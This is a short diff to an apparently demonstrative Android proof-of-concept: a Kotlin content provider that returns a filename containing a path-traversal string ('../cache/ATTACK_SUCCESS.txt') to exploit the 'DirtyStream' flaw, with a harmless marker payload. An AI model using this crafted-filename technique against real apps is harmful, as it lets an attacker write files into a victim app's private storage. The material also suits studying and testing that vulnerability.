@@ -38,7 +38,7 @@ class MaliciousContentProvider : ContentProvider() {
         ))
 
         // 🚨 MALICIOUS FILENAME WITH PATH TRAVERSAL!
-        val maliciousFileName = "../../../ATTACK_SUCCESS.txt"
+        val maliciousFileName = "../cache/ATTACK_SUCCESS.txt"
         val attackPayload = "🚨 DIRTYSTREAM ATTACK SUCCESSFUL! 🚨\nFile written via path traversal vulnerability!"
 
         cursor.addRow(arrayOf(
@@ -57,7 +57,7 @@ class MaliciousContentProvider : ContentProvider() {
             val tempFile = File.createTempFile("attack_", ".txt", context?.cacheDir)
 
             FileOutputStream(tempFile).use { output ->
-                val payload = "🚨 DIRTYSTREAM ATTACK SUCCESSFUL! 🚨\n\nThis file was created by the DirtyStream attack.\nThe vulnerable app trusted our malicious filename '../../../ATTACK_SUCCESS.txt'\nand wrote the file outside its intended directory!"
+                val payload = "🚨 DIRTYSTREAM ATTACK SUCCESSFUL! 🚨\n\nThis file was created by the DirtyStream attack.\nThe vulnerable app trusted our malicious filename '../cache/ATTACK_SUCCESS.txt'\nand wrote this file into its cache directory!"
                 output.write(payload.toByteArray())
             }
 
